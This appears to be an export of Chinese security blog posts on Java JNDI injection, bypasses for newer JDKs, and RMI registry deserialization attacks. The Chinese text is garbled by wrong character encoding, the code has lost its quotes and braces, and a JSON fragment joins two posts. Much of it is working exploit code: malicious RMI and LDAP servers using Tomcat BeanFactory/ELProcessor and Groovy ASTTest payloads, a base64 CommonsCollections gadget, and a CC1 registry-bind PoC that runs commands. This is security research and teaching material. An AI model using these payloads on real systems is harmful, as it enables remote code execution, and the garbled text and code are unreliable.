ä¸ºé…ç½®ä¸­LDAPæœåŠ¡ç«¯å£çš„é»˜è®¤è®¾ç½® è¿è¡Œåä¼šæ›´æ–°æˆå¦‚ä¸‹æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç±»ç»‘ä¸Šå»äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨å®¢æˆ·ç«¯ä¸Šé¢è¿›è¡ŒæŸ¥è¯¢äº† JNDILDAPClientæ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š import javax.naming.InitialContext;public class JNDILDAPClent public static void main(String[] args) throws Exception InitialContext initialContext = new InitialContext(); initialContext.lookup(ldap://localhost:10389/cn=test,dc=example,dc=com); è¿è¡Œåä¾¿ä¼šå¼¹å‡ºè®¡ç®—å™¨ æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥è°ƒè¯•ä¸€ä¸‹æ˜¯æ€ä¹ˆå¯¼è‡´çš„ï¼ŒåŒæ ·æ˜¯è°ƒlookupå‡½æ•° å‰é¢ä¸€éƒ¨åˆ†è‡ªå·±å»è°ƒè¯•ï¼Œç„¶åä¼šèµ°åˆ°è¿™ä¸ªæ¯”è¾ƒé‡è¦çš„æ–‡ä»¶è¿™é‡Œ è¯¥å‡½æ•°æ¯”è¾ƒç§é‡è¦çš„åœ°æ–¹ä¹Ÿæ˜¯ä¸‹é¢çš„decodeObjectå‡½æ•° var4å°±æ˜¯ä»LDAPæœåŠ¡å™¨ä¸Šé¢è·å–åˆ°çš„å±æ€§ï¼Œé‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯è¦è§£æè¿™äº›å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬è·Ÿè¿›å» ä»å‡½æ•°çš„å…·ä½“å†…å®¹é‡Œé¢æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°å¦‚æœè¯´å–å›æ¥çš„å­—æ®µä»£è¡¨çš„æ˜¯åºåˆ—åŒ–çš„ï¼Œé‚£å°±è°ƒç”¨ç¬¬ä¸€ä¸ªifä¸­çš„æ–¹æ³•ï¼Œå¦‚æœæ˜¯è¿œç¨‹å¯¹è±¡çš„è¯å°±è°ƒç”¨ç¬¬äºŒä¸ªifä¸­çš„ï¼Œå¦‚æœæ˜¯å¼•ç”¨çš„è¯ï¼Œå°±æ˜¯è°ƒç”¨elseä¸­çš„decodeReferenceæ–¹æ³•ï¼Œé€šè¿‡è¯¥æ–¹æ³•å°±æŠŠå¼•ç”¨ç»™è§£å‡ºæ¥äº†ï¼Œä¹Ÿå°±ç›¸å½“äºè·å–åˆ°äº†æˆ‘ä»¬ç»‘å®šçš„reference ä¸‹ä¸€æ­¥å°±å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œè¦æ ¹æ®è¯¥referenceæ¥æŸ¥æ‰¾è¿œç¨‹åœ°å€é‡Œé¢çš„æ¶æ„ç±» å¾€ä¸‹èµ°å°±åˆ°äº†è¿™é‡Œ å¾ˆç†Ÿæ‚‰äº†å§ï¼Œæˆ‘ä»¬æ¥ç€è·Ÿè¿›å»ï¼Œèµ°åˆ°è¿™é‡Œ å‰©ä¸‹çš„å’Œä¹‹å‰çš„æ˜¯ä¸€æ ·çš„ï¼Œæ„Ÿå…´è¶£ç»§ç»­è·Ÿè¿›å»ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€èµ˜è¿°äº† é«˜ç‰ˆæœ¬ç»•è¿‡åœ¨æˆ‘ä»¬åˆ©ç”¨Codebaseæ”»å‡»RMIæœåŠ¡çš„æ—¶å€™ï¼Œå¦‚æœæƒ³è¦æ ¹æ®CodebaseåŠ è½½ä½äºè¿œç«¯æœåŠ¡å™¨çš„ç±»æ—¶ï¼Œjava.rmi.server.useCodebaseOnlyçš„å€¼å¿…é¡»ä¸ºfalseã€‚ä½†æ˜¯ä»JDK 6u45ã€7u21å¼€å§‹ï¼Œjava.rmi.server.useCodebaseOnly çš„é»˜è®¤å€¼å°±æ˜¯true JNDIåŒæ ·æœ‰ç±»ä¼¼çš„é™åˆ¶ï¼Œåœ¨JDK 6u132, JDK 7u122, JDK 8u113ä¹‹åJavaé™åˆ¶äº†é€šè¿‡RMIè¿œç¨‹åŠ è½½Referenceå·¥å‚ç±»ã€‚com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºäº†falseï¼Œå³é»˜è®¤ä¸å…è®¸é€šè¿‡RMIä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ã€‚å¦‚ä¸‹æ‰€ç¤º Exception in thread main javax.naming.ConfigurationException: The object factory is untrusted. Set the system property com.sun.jndi.rmi.object.trustURLCodebase to true.\tat com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)\tat com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)\tat com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)\tat javax.naming.InitialContext.lookup(InitialContext.java:417)\tat JNDI_Dynamic.main(JNDI_Dynamic.java:7) Process finished with exit code 1 JNDI_LDAP_Referenceé™åˆ¶ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯JNDIä¸ä»…å¯ä»¥ä»é€šè¿‡RMIåŠ è½½è¿œç¨‹çš„Referenceå·¥å‚ç±»ï¼Œä¹Ÿå¯ä»¥é€šè¿‡LDAPåè®®åŠ è½½è¿œç¨‹çš„Referenceå·¥å‚ç±»ï¼Œä½†æ˜¯åœ¨ä¹‹åçš„ç‰ˆæœ¬Javaä¹Ÿå¯¹LDAP Referenceè¿œç¨‹åŠ è½½Factoryç±»è¿›è¡Œäº†é™åˆ¶ï¼Œåœ¨JDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å com.sun.jndi.ldap.object.trustURLCodebaseå±æ€§çš„é»˜è®¤å€¼åŒæ ·è¢«ä¿®æ”¹ä¸ºäº†falseï¼Œå¯¹åº”çš„CVEç¼–å·ä¸ºï¼šCVE-2018-3149ã€‚ æºç åˆ†æè¿™é‡Œæˆ‘ä»¬ä»¥RMIæœåŠ¡ä¸ºä¾‹ è¿™é‡Œç”¨çš„ç‰ˆæœ¬æ˜¯8u251 å¯ä»¥å‘ç°å½“æˆ‘ä»¬è¿è¡Œå®¢æˆ·ç«¯ä¹‹åæ—¢æ²¡æœ‰æŠ¥é”™ä¹Ÿæ²¡æœ‰å¼¹è®¡ç®—å™¨ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒè¯•ç€çœ‹ä¸€ä¸‹æ˜¯ä¿®æ”¹äº†å“ªäº›åœ°æ–¹ï¼ŒåŒæ ·æ˜¯è°ƒlookupæ–¹æ³• å‰é¢çš„æµç¨‹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ç›´æ¥å¿«è¿›åˆ°ä¸‹é¢è¿™ä¸€æ­¥ è·Ÿè¿›è¯¥æ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•ä¹‹å‰è¯´è¿‡ä¼šå…ˆè¿›è¡Œæœ¬åœ°ç±»åŠ è½½ï¼ŒåŠ è½½ä¸åˆ°ä¹‹åå†åˆ°codebaseä¸­è¿›è¡ŒåŠ è½½ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å°±çœ‹ä¸€ä¸‹åœ¨codebaseä¸­æ—¶æ€ä¹ˆè¿›è¡ŒåŠ è½½çš„ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œé¢å¤šåŠ äº†ä¸€ä¸ªåˆ¤æ–­ï¼štrue.equalsIgnoreCase(trustURLCodebase)ï¼Œåªæœ‰å½“è¿™ä¸ªä¸ºtrueçš„æ—¶å€™æ‰èƒ½å¤Ÿä»è¿œç«¯è¿›è¡Œç±»åŠ è½½ è€ŒtrustURLCodebaseé»˜è®¤ä¸ºfalseï¼Œæ‰€ä»¥æ˜¾ç„¶æ˜¯è¿›å…¥ä¸åˆ°ifä¸­çš„ï¼Œä¼šreturn nullï¼Œä¹Ÿä¸ä¼šæŠ¥é”™ å› æ­¤ç±»ä¹Ÿå°±åŠ è½½ä¸å‡ºæ¥ï¼Œè‡ªç„¶ä¹Ÿå°±å¼¹ä¸äº†è®¡ç®—å™¨äº† å›é¡¾ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬çŸ¥é“å¼•ç”¨è¿˜æ˜¯å¯ä»¥æ­£å¸¸åŠ è½½å‡ºæ¥çš„ï¼Œä½†æ˜¯é€šè¿‡å¼•ç”¨æ¥è¿œç¨‹åŠ è½½å·¥å‚ç±»çš„ï¼ˆä¹Ÿå°±æ˜¯factoryï¼‰æ—¶å€™å°±è¡Œä¸é€šäº† é‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯è¦æ‰¾æ‰¾å¯ä»¥æœ¬åœ°åŠ è½½å‡ºæ¥çš„å·¥å‚ç±»ï¼Œä¹Ÿè¦æ¯”è¾ƒç»å¸¸ç”¨çš„ ç»•è¿‡æ–¹æ³•ä½¿ç”¨æœ¬åœ°çš„Reference Factoryç±»8u191åå·²ç»é»˜è®¤ä¸å…è®¸åŠ è½½codebaseä¸­çš„è¿œç¨‹ç±»ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä»æœ¬åœ°åŠ è½½åˆé€‚Reference Factoryã€‚ éœ€è¦æ³¨æ„æ˜¯ï¼Œè¯¥æœ¬åœ°å·¥å‚ç±»å¿…é¡»å®ç°javax.naming.spi.ObjectFactoryæ¥å£,å› ä¸ºåœ¨javax.naming.spi.NamingManager#getObjectFactoryFromReferenceæœ€åçš„returnè¯­å¥å¯¹Factoryç±»çš„å®ä¾‹å¯¹è±¡è¿›è¡Œäº†ç±»å‹è½¬æ¢ï¼Œå¹¶ä¸”è¯¥å·¥å‚ç±»è‡³å°‘å­˜åœ¨ä¸€ä¸ªgetObjectInstance()æ–¹æ³• Tomcat8org.apache.naming.factory.BeanFactoryå°±æ˜¯æ»¡è¶³æ¡ä»¶ä¹‹ä¸€ï¼Œå¹¶ç”±äºè¯¥ç±»å­˜åœ¨äºTomcat8ä¾èµ–åŒ…ä¸­ï¼Œæ”»å‡»é¢å’ŒæˆåŠŸç‡è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ã€‚ org.apache.naming.factory.BeanFactory åœ¨ getObjectInstance() ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–Referenceæ‰€æŒ‡å‘çš„ä»»æ„Bean Classï¼Œå¹¶ä¸”ä¼šè°ƒç”¨setteræ–¹æ³•ä¸ºæ‰€æœ‰çš„å±æ€§èµ‹å€¼ã€‚è€Œè¯¥Bean Classçš„ç±»åã€å±æ€§ã€å±æ€§å€¼ï¼Œå…¨éƒ½æ¥è‡ªäºReferenceå¯¹è±¡ï¼Œå‡æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚ æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯åŠ è½½ä¾èµ– dependency groupIdorg.apache.tomcat/groupId artifactIdtomcat-catalina/artifactId version8.5.0/version/dependencydependency groupIdorg.lucee/groupId artifactIdjavax.el/artifactId version3.0.0/version/dependencydependency groupIdorg.glassfish/groupId artifactIdjavax.el/artifactId version3.0.0/version /dependency åœ¨è¯¥ç±»ä¸­ä¹Ÿæœ‰ä¸€ä¸ªgetObjectInstanceæ–¹æ³•ï¼Œå› æ­¤åœ¨ä¸Šé¢è¿›è¡Œåˆ°ï¼šfactory.getObjectInstanceä¸€è¡Œæ—¶å°±ä¼šèµ°åˆ°è¯¥æ–‡ä»¶ä¸­ è¯¥æ–¹æ³•é‡ç‚¹å°±åœ¨äºæœ‰ä¸€ä¸ªåå°„è°ƒç”¨ ç”±äºæ˜¯ä»æ ¹æºä¸Šç»•è¿‡ï¼Œæ‰€ä»¥æ— è®ºæ˜¯èµ·ä¸€ä¸ªrmiè¿˜æ˜¯ldapæœåŠ¡éƒ½æ˜¯å¯ä»¥çš„ï¼Œä¸‹é¢èµ·çš„æ˜¯rmiæœåŠ¡ å…ˆå¼€ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒ æœåŠ¡ç«¯ä»£ç ï¼š import org.apache.naming.ResourceRef;import javax.naming.InitialContext;import javax.naming.StringRefAddr;public class JNDIRMIServerBypass public static void main(String[] args) throws Exception InitialContext initialContext = new InitialContext(); ResourceRef ref = new ResourceRef(javax.el.ELProcessor, null, , , true, org.apache.naming.factory.BeanFactory, null); ref.add(new StringRefAddr(forceString, x=eval)); ref.add(new StringRefAddr(x, Runtime.getRuntime().exec(calc))); initialContext.rebind(rmi://localhost:1099/remoteObj, ref); å®¢æˆ·ç«¯ä»£ç ï¼š import javax.naming.InitialContext;public class JNDIRMIClient public static void main(String[] args) throws Exception InitialContext initialContext = new InitialContext(); initialContext.lookup(rmi://localhost:1099/remoteObj); æ‰§è¡Œäº†ä¹‹åä¼šå¼¹å‡ºè®¡ç®—å™¨ ä¹Ÿå°±æ˜¯è¯´å¦‚æœé«˜ç‰ˆæœ¬æœ‰ä¾èµ–Tmocat8çš„ç¯å¢ƒæ¥çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡ Groovyåœ¨Groovyçš„å®˜æ–¹æ–‡æ¡£(ASTest)ä¸­ï¼Œå¯ä»¥å‘ç°çš„æ˜¯ï¼ŒGroovyç¨‹åºå…è®¸æˆ‘ä»¬æ‰§è¡Œæ–­è¨€ï¼Œä¹Ÿå°±æ„å‘³ç€å‘½ä»¤æ‰§è¡Œ @ASTTestæ˜¯ä¸€ç§ç‰¹æ®Šçš„ASTè½¬æ¢ï¼Œå®ƒä¼šåœ¨ç¼–è¯‘æœŸå¯¹ASTæ‰§è¡Œæ–­è¨€ï¼Œè€Œä¸æ˜¯å¯¹ç¼–è¯‘ç»“æœæ‰§è¡Œæ–­è¨€ã€‚è¿™æ„å‘³ç€æ­¤ASTè½¬æ¢åœ¨ç”Ÿæˆå­—èŠ‚ç ä¹‹å‰å¯ä»¥è®¿é—® ASTã€‚@ASTTestå¯ä»¥æ”¾ç½®åœ¨ä»»ä½•å¯æ³¨é‡ŠèŠ‚ç‚¹ä¸Šã€‚ å› æ­¤æ€è·¯å’ŒTomcatç›¸ä¼¼ï¼Œå€ŸåŠ©BeanFactoryçš„åŠŸèƒ½ï¼Œä½¿ç¨‹åºæ‰§è¡ŒGroovyClassLoader#parseClassï¼Œç„¶åå»è§£æGroovyè„šæœ¬ã€‚ æ·»åŠ å¦‚ä¸‹ä¾èµ– dependency groupIdorg.codehaus.groovy/groupId artifactIdgroovy/artifactId version2.4.5/version/dependency æ¶æ„æœåŠ¡ç«¯ import com.sun.jndi.rmi.registry.ReferenceWrapper;import org.apache.naming.ResourceRef;import javax.naming.NamingException;import javax.naming.StringRefAddr;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry; public class RMI_Server_Bypass_Groovy public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException Registry registry = LocateRegistry.createRegistry(1099); ResourceRef resourceRef = new ResourceRef(groovy.lang.GroovyClassLoader, null, , , true,org.apache.naming.factory.BeanFactory,null); resourceRef.add(new StringRefAddr(forceString, faster=parseClass)); String script = String.format(@groovy.transform.ASTTest(value= assert java.lang.Runtime.getRuntime().exec(\\%s\\) ) def faster , calc); resourceRef.add(new StringRefAddr(faster,script)); ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); registry.bind(Groovy2bypass, referenceWrapper); System.out.println(Registryè¿è¡Œä¸­......); ä¿®æ”¹ç³»ç»Ÿå˜é‡trustURLCodebaseå±æ€§æ˜¯ä¸€ä¸ªç³»ç»Ÿå˜é‡ï¼Œæ­£å¥½javaé‡Œé¢ä¹Ÿæœ‰æä¾›å¦‚ä½•ä¿®æ”¹ç³»ç»Ÿå˜é‡å€¼çš„æ–¹æ³• System.setProperty(com.sun.jndi.ldap.object.trustURLCodebase,true);Field field = BaseRowSet.class.getDeclaredField(dataSource);field.setAccessible(true);JdbcRowSetImpl jdbcRowSet = createObjWithoutConstructor(JdbcRowSetImpl.class);field.set(jdbcRowSet,ldap://127.0.0.1:8085/evil);jdbcRowSet.getDatabaseMetaData(); jdk17LDAP Serveré™¤äº†ä½¿ç”¨JNDI Referenceè¿›è¡Œåˆ©ç”¨ä¹‹å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ã€‚å¦‚æœJavaå¯¹è±¡çš„ javaSerializedData å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„ obj.decodeObject() æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚ å…¶ä¸­å…·ä½“çš„å¤„ç†ä»£ç å¦‚ä¸‹ï¼š if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) ClassLoader cl = helper.getURLClassLoader(codebases); return deserializeObject((byte[])attr.get(), cl); éœ€è¦å­˜åœ¨å¯ç”¨çš„ gadget ï¼Œè¿™é‡Œæ‹¿ cc6 æ¥æµ‹è¯•ï¼ŒLADP Server package org.example; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.URL; import java.util.Base64; public class LDAP_BS private static final String LDAP_BASE = dc=example,dc=com; public static void main ( String[] tmp_args ) String[] args=new String[]http://127.0.0.1/#BS; int port = 9999; try InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( listen, //$NON-NLS-1$ InetAddress.getByName(0.0.0.0), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(Listening on 0.0.0.0: + port); //$NON-NLS-1$ ds.startListening(); catch ( Exception e ) e.printStackTrace(); private static class OperationInterceptor extends InMemoryOperationInterceptor private URL codebase; public OperationInterceptor ( URL cb ) this.codebase = cb; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try sendResult(result, base, e); catch ( Exception e1 ) e1.printStackTrace(); protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception e.addAttribute(javaClassName, foo); //getObjectè·å–Gadget e.addAttribute(javaSerializedData, Base64.getDecoder().decode(rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWJjc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABxzcQB+ABN1cQB+ABgAAAACcHB0AAZpbnZva2V1cQB+ABwAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQABGNhbGN0AARleGVjdXEAfgAcAAAAAXEAfgAfc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AANlZWV4)); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); æ¨¡æ‹Ÿå—å®³è€…è¿›è¡ŒJNDI lookupæ“ä½œï¼Œæˆ–è€…ä½¿ç”¨Fastjsonç­‰æ¼æ´æ¨¡æ‹Ÿè§¦å‘ï¼Œå³å¯çœ‹åˆ°å¼¹è®¡ç®—å™¨çš„å‘½ä»¤è¢«æ‰§è¡Œã€‚ package jndi_rmi_injection;import javax.naming.InitialContext;import javax.naming.NamingException;public class LDAPClient public static void main(String[] args) throws NamingException try String url = ldap://localhost:1389/foo; InitialContext initialContext = new InitialContext(); initialContext.lookup(url); catch (Exception e) e.printStackTrace(); è¿™ç§ç»•è¿‡æ–¹å¼éœ€è¦åˆ©ç”¨ä¸€ä¸ªæœ¬åœ°çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œå¦‚CommonsCollectionsæˆ–è€…ç»“åˆFastjsonç­‰æ¼æ´å…¥å£ç‚¹å’ŒJdbcRowSetImplè¿›è¡Œç»„åˆåˆ©ç”¨ jdk21è€Œåœ¨æ›´é«˜ç‰ˆæœ¬çš„ jdk 21 ä¸­å°±ä¼šæŠ¥é”™ï¼Œ å‰é¢åœ¨ Obj.decodeObject æ–¹æ³•ä¸­çœ‹åˆ°è¿™é‡Œåœ¨ååºåˆ—åŒ–å‰æœ‰ä¸ª if åˆ¤æ–­ è·Ÿè¿› isSerialDataAllowed() æ–¹æ³•ï¼Œåœ¨ jdk21 å±æ€§ trustSerialData é»˜è®¤å°±æ˜¯ false äº† æ‰€ä»¥åœ¨ jdk21 ä¸­æ— æ³•ç”¨è¯¥æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œä¸è¿‡å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« è¿›è¡Œç»•è¿‡ï¼šhttps://vidar-team.feishu.cn/docx/ScXKd2ISEo8dL6xt5imcQbLInGc","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–ä¹‹RMI/JRMPååºåˆ—åŒ–æ¼æ´","path":"/2025/01/08/javaååºåˆ—åŒ–ä¹‹RMI-JRMPååºåˆ—åŒ–æ¼æ´/","content":"å¼•ç”¨Javaå®‰å…¨ä¹‹RMIååºåˆ—åŒ– æ”»å‡»æ³¨å†Œä¸­å¿ƒå®¢æˆ·ç«¯ä¸æ³¨å†Œä¸­å¿ƒè¿›è¡Œäº¤äº’å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š list bind rebind unbind lookup è¿™å‡ ç§æ–¹æ³•ä½äºRegistryImpl_Skel.classæ–‡ä»¶ä¸­çš„dispatchæ–¹æ³•ä¸­ï¼Œå¦‚æœå­˜åœ¨readObjectåˆ™å¯ä»¥è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œå…·ä½“æ–¹æ³•å†…å®¹å¯ä»¥è‡ªå·±å»çœ‹ä¸€ä¸‹ dispatché‡Œé¢å¯¹åº”å…³ç³»å¦‚ä¸‹ 0-bind 1-list 2-lookup 3-rebind 4-unbind case1ç›¸å…³ä»£ç ä¸­æ²¡æœ‰readObjectæ–¹æ³•ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ å½“è°ƒç”¨bindæ—¶ï¼Œä¼šç”¨readObjectè¯»å‡ºå‚æ•°åä»¥åŠè¿œç¨‹å¯¹è±¡ï¼Œæ­¤æ—¶åˆ™å¯ä»¥åˆ©ç”¨ å½“è°ƒç”¨rebindæ—¶ï¼Œä¼šç”¨readObjectè¯»å‡ºå‚æ•°åå’Œè¿œç¨‹å¯¹è±¡ï¼Œè¿™é‡Œå’Œbindæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥éƒ½å¯ä»¥åˆ©ç”¨ å¦‚æœæœåŠ¡ç«¯å­˜åœ¨cc1ç›¸å…³ç»„ä»¶æ¼æ´ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨ååºåˆ—åŒ–æ”»å‡»ï¼ˆæœ‰ccä¾èµ–çš„è¯ç›¸å…³pocéƒ½å¯ä»¥ä½¿ç”¨ï¼‰ æ³¨å†Œä¸­å¿ƒä¸Šè°ƒç”¨çš„æ˜¯RegistryImpl_Skel.classæ–‡ä»¶ä¸­çš„dispatchæ–¹æ³•é‡Œé¢çš„bind()ï¼Œè€Œåœ¨å®¢æˆ·ç«¯ä¸Šè°ƒç”¨çš„æ˜¯RegistryImpl_Stubé‡Œé¢çš„bind()æ–¹æ³• Pocbindcase 0: try var11 = var2.getInputStream(); var7 = (String)var11.readObject(); var8 = (Remote)var11.readObject(); catch (IOException var94) throw new UnmarshalException(error unmarshalling arguments, var94); catch (ClassNotFoundException var95) throw new UnmarshalException(error unmarshalling arguments, var95); finally var2.releaseInputStream(); var6.bind(var7, var8); try var2.getResultStream(true); break; catch (IOException var93) throw new MarshalException(error marshalling return, var93); ä¸‹é¢çš„pocä¸­å¹¶ä¸æ˜¯åœ¨æ‰§è¡Œbindæ–¹æ³•çš„æ—¶å€™è¿›è¡Œååºåˆ—æ”»å‡»ï¼Œè€Œæ˜¯åœ¨å‰é¢çš„readObjectæ—¶è¿›è¡Œçš„ååºåˆ—åŒ–æ”»å‡»ï¼Œè‡ªå·±è·Ÿç€èµ°ä¸€ä¸‹å°±çŸ¥é“äº† import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.HashMap;import java.util.Map;public class ClientPoc public static void main(String[] args) throws Exception Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); map.put(value, b); MapObject, Object transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(Target.class, transformedMap); Registry registry = LocateRegistry.getRegistry(127.0.0.1,1099); Remote r = Remote.class.cast(Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[] Remote.class , (InvocationHandler) o)); registry.bind(test,r); Remote.class.castè¿™é‡Œå®é™…ä¸Šæ˜¯å°†ä¸€ä¸ªä»£ç†å¯¹è±¡è½¬æ¢ä¸ºäº†Remoteå¯¹è±¡ public T cast(Object obj) if (obj != null !isInstance(obj)) throw new ClassCastException(cannotCastMsg(obj)); return (T) obj; unbindlookupcase 2: try var10 = var2.getInputStream(); var7 = (String)var10.readObject(); catch (IOException var89) throw new UnmarshalException(error unmarshalling arguments, var89); catch (ClassNotFoundException var90) throw new UnmarshalException(error unmarshalling arguments, var90); finally var2.releaseInputStream(); var8 = var6.lookup(var7);case 4: try var10 = var2.getInputStream(); var7 = (String)var10.readObject(); catch (IOException var81) throw new 